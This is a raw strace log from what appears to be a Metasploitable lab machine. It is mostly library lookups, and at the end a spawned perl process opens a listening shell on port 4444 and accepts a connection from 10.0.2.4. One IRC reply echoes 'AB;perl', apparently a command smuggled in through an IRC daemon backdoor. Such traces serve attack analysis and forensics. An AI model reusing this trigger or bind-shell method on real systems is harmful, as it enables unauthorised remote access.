5840  07:10:58.207295 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207356 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207369 stat64("/lib/tls/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207381 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207393 stat64("/lib/tls/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207405 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207418 stat64("/lib/tls/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207443 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207454 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207471 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207483 stat64("/lib/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207494 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207506 stat64("/lib/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207517 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207529 stat64("/lib/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207539 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207551 stat64("/lib/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207561 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207573 stat64("/lib/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207584 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207595 stat64("/lib/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207606 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207617 stat64("/lib/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207628 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207639 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207655 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207668 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207680 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207692 stat64("/usr/lib/tls/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207704 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207716 stat64("/usr/lib/tls/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207727 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207739 stat64("/usr/lib/tls/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207750 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207762 stat64("/usr/lib/tls/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207771 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207771 stat64("/usr/lib/tls/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207771 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207771 stat64("/usr/lib/tls/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207771 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207772 stat64("/usr/lib/tls", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207772 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207772 stat64("/usr/lib/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207772 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207773 stat64("/usr/lib/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207773 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207773 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207773 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207773 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207774 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207774 stat64("/usr/lib/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207774 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207774 stat64("/usr/lib/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207775 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207804 stat64("/usr/lib/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207844 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207856 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
5840  07:10:58.207890 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207903 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207916 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207929 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207941 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207954 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207966 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207978 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207990 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208003 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208015 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208027 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208039 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208052 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208063 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208075 stat64("/lib/i486-linux-gnu/tls", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208087 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208100 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208115 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208128 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208140 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208153 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208164 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208177 stat64("/lib/i486-linux-gnu/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208188 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208201 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208213 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208225 stat64("/lib/i486-linux-gnu/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208236 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208248 stat64("/lib/i486-linux-gnu/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208260 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208272 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.208299 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208340 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208368 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208397 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208409 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208423 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208435 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208448 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208460 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208473 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208486 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208498 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208510 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208523 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208535 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208548 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208559 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208572 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208585 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208598 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208613 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208626 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208638 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208651 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208663 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208676 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208688 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208701 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208712 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208725 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.208737 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.208749 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.208770 munmap(0xb7db2000, 29913) = 0
5840  07:10:58.208800 open("/etc/ld.so.cache", O_RDONLY) = 6
5840  07:10:58.208841 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5840  07:10:58.208872 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7db2000
5840  07:10:58.208896 close(6)          = 0
5840  07:10:58.208924 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5840  07:10:58.208939 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
5840  07:10:58.208953 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5840  07:10:58.209042 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5840  07:10:58.209064 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7da7000
5840  07:10:58.209076 mmap2(0xb7db0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7db0000
5840  07:10:58.209093 close(6)          = 0
5840  07:10:58.209116 munmap(0xb7db2000, 29913) = 0
5840  07:10:58.209132 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5840  07:10:58.209147 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5840  07:10:58.209163 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5840  07:10:58.209180 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db9000
5840  07:10:58.209190 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5840  07:10:58.209428 close(6)          = 0
5840  07:10:58.209439 munmap(0xb7db9000, 4096) = 0
5840  07:10:58.209458 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5840  07:10:58.209471 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5840  07:10:58.209488 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db9000
5840  07:10:58.209498 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5840  07:10:58.209672 close(6)          = 0
5840  07:10:58.209682 munmap(0xb7db9000, 4096) = 0
5840  07:10:58.209709 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
5840  07:10:58.209729 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61808) = -1 EINVAL (Invalid argument)
5840  07:10:58.209742 _llseek(6, 0, 0xbfe61850, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.209754 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61808) = -1 EINVAL (Invalid argument)
5840  07:10:58.209764 _llseek(6, 0, 0xbfe61850, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.209774 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
5840  07:10:58.210265 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
5840  07:10:58.210384 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
5840  07:10:58.210447 listen(6, 5)      = 0
5840  07:10:58.210518 accept(6,  <unfinished ...>
5839  07:10:58.230621 exit_group(0)     = ?
5837  07:10:58.230700 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5839
5837  07:10:58.230716 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5837  07:10:58.230728 --- SIGCHLD (Child exited) @ 0 (0) ---
5837  07:10:58.230736 waitpid(-1, 0xbfd508c8, WNOHANG) = -1 ECHILD (No child processes)
5837  07:10:58.230747 sigreturn()       = ? (mask now [])
5837  07:10:58.230763 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5837  07:10:58.230806 exit_group(0)     = ?
4519  07:10:58.230885 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5837
4519  07:10:58.230899 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:10:58.230930 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:10:58.230958 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:10:58.230967 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:10:58.230986 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:10:58.231047 time(NULL)        = 1495624258
4519  07:10:58.231061 time(NULL)        = 1495624258
4519  07:10:58.231099 gettimeofday({1495624258, 231103}, NULL) = 0
4519  07:10:58.231113 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:58.231187 clock_gettime(CLOCK_MONOTONIC, {1068, 48217981}) = 0
4519  07:10:58.231217 gettimeofday({1495624258, 231222}, NULL) = 0
4519  07:10:58.231229 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
5840  07:10:58.338474 <... accept resumed> {sa_family=AF_INET, sin_port=htons(34915), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
5840  07:10:58.338524 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe607f8) = -1 EINVAL (Invalid argument)
5840  07:10:58.338540 _llseek(8, 0, 0xbfe60840, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.338553 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe607f8) = -1 EINVAL (Invalid argument)
5840  07:10:58.338563 _llseek(8, 0, 0xbfe60840, SEEK_CUR) = -1 ESPIPE (Illegal seek)
